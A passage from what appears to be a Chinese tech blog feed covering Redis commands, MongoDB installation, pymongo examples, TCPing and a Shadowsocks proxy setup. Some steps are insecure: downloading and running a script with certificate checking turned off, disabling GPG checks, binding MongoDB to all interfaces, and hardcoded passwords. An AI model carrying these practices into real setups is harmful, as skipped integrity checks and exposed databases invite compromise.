withscores=False, score_cast_func=float)</span></span><br><span class="line"><span class="comment"># 从大到小排序</span></span><br><span class="line"><span class="comment"># zrevrangebyscore(name, max, min, start=None, num=None, withscores=False, score_cast_func=float)</span></span><br><span class="line"></span><br><span class="line">red.zrank(name, value)</span><br><span class="line"><span class="comment"># 获取某个值在name对应的有序集合中的排行（从0开始）</span></span><br><span class="line"><span class="comment"># 更多：</span></span><br><span class="line"><span class="comment"># zrevrank(name, value)，从大到小排序</span></span><br><span class="line"></span><br><span class="line">red.zrangebylex(name, <span class="built_in">min</span>, <span class="built_in">max</span>, start=<span class="literal">None</span>, num=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 当有序集合的所有成员都具有相同的分值时，有序集合的元素会根据成员的值（lexicographical ordering）来进行排序，而这个命令则可以返回给定的有序集合键key中，元素的值介于min和max之间的成员</span></span><br><span class="line"><span class="comment"># 对集合中的每个成员进行逐个字节的对比（byte-by-byte compare），并按照从低到高的顺序，返回排序后的集合成员。如果两个字符串有一部分内容是相同的话，那么命令会认为较长的字符串比较短的字符串要大</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment"># name，redis的name</span></span><br><span class="line"><span class="comment"># min，左区间（值）。+表示正无限；-表示负无限；(表示开区间；[则表示闭区间</span></span><br><span class="line"><span class="comment"># min，右区间（值）</span></span><br><span class="line"><span class="comment"># start，对结果进行分片处理，索引位置</span></span><br><span class="line"><span class="comment"># num，对结果进行分片处理，索引后面的num个元素</span></span><br><span class="line"></span><br><span class="line">red.zrem(name, values)</span><br><span class="line"><span class="comment"># 删除name对应的有序集合中值是values的成员</span></span><br><span class="line"><span class="comment"># 如：zrem(&#x27;zz&#x27;, [&#x27;s1&#x27;, &#x27;s2&#x27;])</span></span><br><span class="line"></span><br><span class="line">red.zremrangebyrank(name, <span class="built_in">min</span>, <span class="built_in">max</span>)</span><br><span class="line"><span class="comment"># 根据排行范围删除</span></span><br><span class="line"></span><br><span class="line">red.zremrangebyscore(name, <span class="built_in">min</span>, <span class="built_in">max</span>)</span><br><span class="line"><span class="comment"># 根据分数范围删除</span></span><br><span class="line"></span><br><span class="line">red.zremrangebylex(name, <span class="built_in">min</span>, <span class="built_in">max</span>)</span><br><span class="line"><span class="comment"># 根据值返回删除</span></span><br><span class="line"></span><br><span class="line">red.zscore(name, value)</span><br><span class="line"><span class="comment"># 获取name对应有序集合中 value 对应的分数</span></span><br><span class="line"></span><br><span class="line">red.zinterstore(dest, keys, aggregate=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 获取两个有序集合的交集，如果遇到相同值不同分数，则按照aggregate进行操作</span></span><br><span class="line"><span class="comment"># aggregate的值为: SUM MIN MAX</span></span><br><span class="line"></span><br><span class="line">red.zunionstore(dest, keys, aggregate=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 获取两个有序集合的并集，如果遇到相同值不同分数，则按照aggregate进行操作</span></span><br><span class="line"><span class="comment"># aggregate的值为: SUM MIN MAX</span></span><br><span class="line"></span><br><span class="line">red.zscan(name, cursor=<span class="number">0</span>, <span class="keyword">match</span>=<span class="literal">None</span>, count=<span class="literal">None</span>, score_cast_func=<span class="built_in">float</span>)</span><br><span class="line">red.zscan_iter(name, <span class="keyword">match</span>=<span class="literal">None</span>, count=<span class="literal">None</span>, score_cast_func=<span class="built_in">float</span>)</span><br><span class="line"><span class="comment"># 同字符串相似，相较于字符串新增score_cast_func，用来对分数进行操作</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No84：MongoDB安装方法</title>
      <link href="/posts/de780577.html"/>
      <url>/posts/de780577.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>配置yum源</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/mongodb-org-4.0.repo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加以下内容：</span></span><br><span class="line">[mongodb-org-4.0]</span><br><span class="line">name=MongoDB Repository</span><br><span class="line">baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/4.0/x86_64/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里可以修改gpgcheck=0，省去gpg验证</span></span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=https://www.mongodb.org/static/pgp/server-4.0.asc</span><br></pre></td></tr></table></figure><ul><li>生成缓存</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install mongodb-org</span><br></pre></td></tr></table></figure><ul><li>启动服务并设置开机启动</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令行启动</span></span><br><span class="line">/usr/bin/mongod --quiet --config /etc/mongod.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start mongod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop mongod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart mongod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">systemctl status mongod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动</span></span><br><span class="line">systemctl enable mongod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载服务配置</span></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><ul><li>查看安装位置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whereis mongod</span><br></pre></td></tr></table></figure><p>默认配置文件路径：</p><p>配置文件：&#x2F;etc&#x2F;mongod.conf</p><p>数据文件：&#x2F;var&#x2F;lib&#x2F;mongo</p><p>日志文件：&#x2F;var&#x2F;log&#x2F;mongodb</p><p>服务启动脚本：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mongod.service</p><p>socket文件：&#x2F;run&#x2F;mongodb&#x2F;mongod.pid</p><ul><li>查看修改配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/mongod.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释bindIp或者设置为0.0.0.0</span></span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop mongod</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除安装的包</span></span><br><span class="line">yum erase $(rpm -qa | grep mongodb-org)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除配置文件</span></span><br><span class="line">rm -rf /etc/mongod.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除数据文件</span></span><br><span class="line">rm -rf /var/lib/mongo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除日志文件</span></span><br><span class="line">rm -rf /var/log/mongodb</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>导入包管理系统使用的公钥</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4</span><br></pre></td></tr></table></figure><ul><li>为MongoDB创建一个列表文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/4.0 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list</span><br></pre></td></tr></table></figure><ul><li>更新本地包数据库</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><ul><li>安装最新版本</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install mongodb-org</span><br></pre></td></tr></table></figure><ul><li>安装指定版本</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y mongodb-org=4.0.0 mongodb-org-server=4.0.0 mongodb-org-shell=4.0.0 mongodb-org-mongos=4.0.0 mongodb-org-tools=4.0.0</span><br></pre></td></tr></table></figure><ul><li>服务管理</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">sudo service mongod start</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止</span></span><br><span class="line">sudo service mongod stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">sudo service mongod status</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动mongodb服务</span></span><br><span class="line">sudo systemctl enable mongod</span><br></pre></td></tr></table></figure><ul><li>修改配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/mongod.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据库存储路径</span></span><br><span class="line">dbPath: /var/lib/mongodb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以追加的方式写入日志</span></span><br><span class="line">logAppend: true</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志文件路径</span></span><br><span class="line">path: /var/log/mongodb/mongod.log</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据库端口</span></span><br><span class="line">port: 27017</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">绑定监听的ip，127.0.0.1只能监听本地的连接，可以改为0.0.0.0</span></span><br><span class="line">bindIp: 127.0.0.1</span><br></pre></td></tr></table></figure><ul><li>查看守护进程运行状态</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux | grep mongod</span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭守护进程mongod</span></span><br><span class="line">sudo service mongod stop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载安装的软件包</span></span><br><span class="line">sudo apt-get remove --purge mongodb-org*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据库和日志文件的路径取决于/etc/mongod.conf文件中的配置</span></span><br><span class="line">sudo rm -r /var/log/mongodb</span><br><span class="line">sudo rm -r /var/lib/mongodb</span><br></pre></td></tr></table></figure><h3 id="3、Windows10"><a href="#3、Windows10" class="headerlink" title="3、Windows10"></a>3、Windows10</h3><ul><li>环境变量</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装目录</span></span><br><span class="line">D:\PortableFiles\MongoDB</span><br></pre></td></tr></table></figure><ul><li>添加目录</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据目录</span></span><br><span class="line">/data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志目录</span></span><br><span class="line">/log</span><br></pre></td></tr></table></figure><ul><li>注册服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装目录</span></span><br><span class="line">mongod.exe --dbpath &quot;D:\PortableFiles\MongoDB\data&quot; --logpath &quot;D:\PortableFiles\MongoDB\log\mongodb.log&quot; --install --serviceName &quot;MongoDB&quot; --logappend --directoryperdb</span><br></pre></td></tr></table></figure><ul><li>操作服务</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">net start mongodb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">net stop mongodb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No83：Python-Pymongo使用技巧</title>
      <link href="/posts/3dab839e.html"/>
      <url>/posts/3dab839e.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、update更新数据"><a href="#1、update更新数据" class="headerlink" title="1、update更新数据"></a>1、update更新数据</h3><ul><li>现在集合里有3条数据</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">mongo_client = pymongo.MongoClient(</span><br><span class="line">        host=<span class="string">&quot;192.168.0.112&quot;</span>, port=<span class="number">27017</span>, username=<span class="string">&quot;admin&quot;</span>, password=<span class="string">&quot;123456&quot;</span></span><br><span class="line">)</span><br><span class="line">mongo_db = mongo_client[<span class="string">&quot;db1&quot;</span>]</span><br><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">res = mongo_db.chat.find()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># &#123;&quot;_id&quot;: ObjectId(&quot;5cb0ba3abd99392b1427c25e&quot;)&#125;</span></span><br><span class="line"><span class="comment"># &#123;&quot;_id&quot;: ObjectId(&quot;5cb0bbf9bd993914d8b5d82c&quot;), &quot;name&quot;: &quot;jack&quot;, &quot;age&quot;: 13&#125;</span></span><br><span class="line"><span class="comment"># &#123;&quot;_id&quot;: ObjectId(&quot;5cb0bbf9bd993914d8b5d82d&quot;), &quot;name&quot;: &quot;mike&quot;, &quot;age&quot;: 33&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>更新单条数据</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">mongo_client = pymongo.MongoClient(</span><br><span class="line">        host=<span class="string">&quot;192.168.0.112&quot;</span>, port=<span class="number">27017</span>, username=<span class="string">&quot;admin&quot;</span>, password=<span class="string">&quot;123456&quot;</span></span><br><span class="line">)</span><br><span class="line">mongo_db = mongo_client[<span class="string">&quot;db1&quot;</span>]</span><br><span class="line"><span class="comment"># 更新数据</span></span><br><span class="line">res = mongo_db.chat.update_one(&#123;<span class="string">&quot;age&quot;</span>: <span class="number">13</span>&#125;, &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;age&quot;</span>: <span class="number">34</span>&#125;&#125;)</span><br><span class="line"><span class="comment"># modified_count，返回更新的条数</span></span><br><span class="line"><span class="built_in">print</span>(res, res.modified_count)</span><br><span class="line"><span class="comment"># 查询是否更新成功</span></span><br><span class="line">res = mongo_db.chat.find_one(&#123;<span class="string">&quot;age&quot;</span>: <span class="number">34</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回被更新对象</span></span><br><span class="line"><span class="comment"># &lt;pymongo.results.UpdateResult object at 0x0000000002EDBF08&gt;</span></span><br><span class="line"><span class="comment"># 1代表更新的条数</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 数据改变，更新成功</span></span><br><span class="line"><span class="comment"># &#123;&#x27;_id&#x27;: ObjectId(&#x27;5cb0bbf9bd993914d8b5d82c&#x27;), &#x27;name&#x27;: &#x27;jack&#x27;, &#x27;age&#x27;: 34&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>更新多条数据</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">mongo_client = pymongo.MongoClient(</span><br><span class="line">        host=<span class="string">&quot;192.168.0.112&quot;</span>, port=<span class="number">27017</span>, username=<span class="string">&quot;admin&quot;</span>, password=<span class="string">&quot;123456&quot;</span></span><br><span class="line">)</span><br><span class="line">mongo_db = mongo_client[<span class="string">&quot;db1&quot;</span>]</span><br><span class="line"><span class="comment"># 更新数据</span></span><br><span class="line">res = mongo_db.chat.update_many(&#123;<span class="string">&quot;age&quot;</span>: &#123;<span class="string">&quot;$gte&quot;</span>: <span class="number">0</span>&#125;&#125;, &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;age&quot;</span>: <span class="number">888</span>&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span>(res, res.modified_count)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回对象</span></span><br><span class="line"><span class="comment"># &lt;pymongo.results.UpdateResult object at 0x0000000002EDBF08&gt;</span></span><br><span class="line"><span class="comment"># 2代表更新2条数据</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、index索引相关操作"><a href="#2、index索引相关操作" class="headerlink" title="2、index索引相关操作"></a>2、index索引相关操作</h3><p>简单总结一下pymongo中与index操作相关一些函数，常用的有：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create_index</span><br><span class="line">drop_index</span><br><span class="line">index_information</span><br></pre></td></tr></table></figure><p>最主要的是create_index，可以用它来为mongo的collection建立索引。</p><p>以下操作一些简单的例子，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo <span class="keyword">as</span> pm</span><br><span class="line"></span><br><span class="line">client = pm.MongoClient(</span><br><span class="line">        <span class="string">&quot;mongodb://user:password@127.0.0.1:27017&quot;</span>,</span><br><span class="line">        ssl=<span class="literal">True</span>,</span><br><span class="line">        ssl_ca_certs=<span class="string">&quot;/tmp/mongo_local.pem&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">db = client[<span class="string">&quot;my_db&quot;</span>]</span><br><span class="line"></span><br><span class="line">collection = db[<span class="string">&quot;my_collection&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得已有索引</span></span><br><span class="line"><span class="built_in">print</span>([x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">dir</span>(collection) <span class="keyword">if</span> <span class="string">&quot;index&quot;</span> <span class="keyword">in</span> x])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建索引</span></span><br><span class="line">collection.create_index([(<span class="string">&quot;x&quot;</span>, <span class="number">1</span>)], unique=<span class="literal">True</span>, background=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得索引帮助</span></span><br><span class="line"><span class="built_in">help</span>(collection.create_index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得索引信息</span></span><br><span class="line">collection.index_infomation()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据索引说明符删除索引</span></span><br><span class="line">collection.drop_index([(<span class="string">&quot;x&quot;</span>, <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据索引名称删除索引</span></span><br><span class="line">collection.drop_index(<span class="string">&quot;idx_x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多个字段创建索引</span></span><br><span class="line">collection.create_index([(<span class="string">&quot;x&quot;</span>, <span class="number">1</span>), (<span class="string">&quot;y&quot;</span>, <span class="number">1</span>)])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>语法中(‘x’,1),x值为要创建的索引字段名，1为指定按升序创建索引，可以用pymongo.ASCENDING代替。如果你想按降序来创建索引，则指定为<br>-1或pymongo.DESCENDING。</p><p>在使用create_index()创建索引时，也可指定特定的参数(options)，常用可选参数如下：</p><ul><li>background：boolean</li></ul><p>建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加“background”可选参数。“background”默认值为False。</p><ul><li>unique：boolean</li></ul><p>建立的索引是否唯一。指定为True来创建唯一索引。默认值为False.默认情况下，MongoDB在创建集合时会生成唯一索引字段_id。</p><ul><li>name：string</li></ul><p>索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。例如create_index([(‘x’,1)]<br>在不指定name时会生成默认的索引名称‘x_1’。</p><ul><li>expireAfterSeconds：integer</li></ul><p>指定一个以秒为单位的数值，完成TTL设定，设定集合的生存时间。需要在值为日期或包含日期值的数组的字段的创建。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No82：端口测试小工具TCPing</title>
      <link href="/posts/9028508.html"/>
      <url>/posts/9028508.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、Windows"><a href="#1、Windows" class="headerlink" title="1、Windows"></a>1、Windows</h3><p><a href="https://elifulkerson.com/projects/tcping.php">下载地址</a></p><p>将下载的EXE程序放到C:\Windows\System32文件夹下，即可在cmd中使用tcping命令。</p><p>语法</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcping [-q] [-t timeout_sec] [-u timeout_usec] &lt;host&gt; &lt;port&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-q : quiet mode, <span class="keyword">do</span> not output anything (except error messages)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t : <span class="built_in">timeout</span> <span class="keyword">in</span> seconds</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-u : <span class="built_in">timeout</span> <span class="keyword">in</span> microseconds</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line">tcping www.baidu.com 80</span><br><span class="line">tcping64 www.baidu.com 80</span><br></pre></td></tr></table></figure><h3 id="2、Linux"><a href="#2、Linux" class="headerlink" title="2、Linux"></a>2、Linux</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载tar包</span></span><br><span class="line">wget http://linuxco.de/tcping/tcping-1.3.5.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压缩</span></span><br><span class="line">tar -xvzf tcping-1.3.5.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果没有安装GCC，安装一下GCC</span></span><br><span class="line">yum install gcc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用GCC编译生成执行文件tcping</span></span><br><span class="line">gcc -o tcping tcping.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将tcping拷贝到路径/usr/bin下面</span></span><br><span class="line">cp tcping /usr/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试一下</span></span><br><span class="line">tcping www.baidu.com 80</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No81：科学上网之搭建Python版本Shadowsocks</title>
      <link href="/posts/7284cf68.html"/>
      <url>/posts/7284cf68.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装与卸载"><a href="#1、安装与卸载" class="headerlink" title="1、安装与卸载"></a>1、安装与卸载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载</span></span><br><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">赋予执行权限</span></span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks-all.log</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载</span></span><br><span class="line">./shadowsocks.sh uninstall</span><br></pre></td></tr></table></figure><h3 id="2、安装过程"><a href="#2、安装过程" class="headerlink" title="2、安装过程"></a>2、安装过程</h3><p>执行之后会提示输入：语言、密码、端口、加密方式。。。</p><p>最后出现以下信息成功。</p><p>成功后从服务器控制台开放端口。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Congratulations, your_shadowsocks_version install completed!</span><br><span class="line">Your Server IP :192.168.11.11</span><br><span class="line">Your Server Port :8080</span><br><span class="line">Your Password :1234567890</span><br><span class="line">Your Encryption Method:aes-256-cfb</span><br><span class="line">Welcome to visit:https://teddysun.com/486.html</span><br><span class="line">Enjoy it</span><br></pre></td></tr></table></figure><h3 id="3、命令操作"><a href="#3、命令操作" class="headerlink" title="3、命令操作"></a>3、命令操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">/etc/init.d/shadowsocks start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止</span></span><br><span class="line">/etc/init.d/shadowsocks stop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">/etc/init.d/shadowsocks restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">状态</span></span><br><span class="line">/etc/init.d/shadowsocks status</span><br></pre></td></tr></table></figure><h3 id="4、配置文件"><a href="#4、配置文件" class="headerlink" title="4、配置文件"></a>4、配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件，修改完毕重启服务即可</span></span><br><span class="line">vim /etc/shadowsocks.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单端口</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">    &quot;server_port&quot;:11111,</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,</span><br><span class="line">    &quot;password&quot;:&quot;password&quot;,</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;，</span><br><span class="line">    &quot;fast_open&quot;:false</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多端口</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">    &quot;local_address&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,</span><br><span class="line">    &quot;port_password&quot;:&#123;</span><br><span class="line">        &quot;11111&quot;:&quot;11111&quot;,</span><br><span class="line">        &quot;22222&quot;:&quot;22222&quot;,</span><br><span class="line">        &quot;33333&quot;:&quot;33333&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class="line">    &quot;fast_open&quot;:false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5、客户端"><a href="#5、客户端" class="headerlink" title="5、客户端"></a>5、客户端</h3><p><a href="https://www.softpedia.com/get/Internet/Servers/Proxy-Servers/Shadowsocks.shtml">下载地址</a></p><p>下载安装客户端以后，只需按服务器的配置填写IP地址、服务器端口、本地端口、密码、加密方式等参数。</p><h3 id="5、PAC代理"><a href="#5、PAC代理" class="headerlink" title="5、PAC代理"></a>5、PAC代理</h3><p>客户端支持全局代理和PAC代理两种方式，推荐谷歌插件switchyOmega。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No80：科学上网之V2Ray+锐速、BBR</title>
      <link href="/posts/3abeed33.html"/>
      <url>/posts/3abeed33.html</url>
      
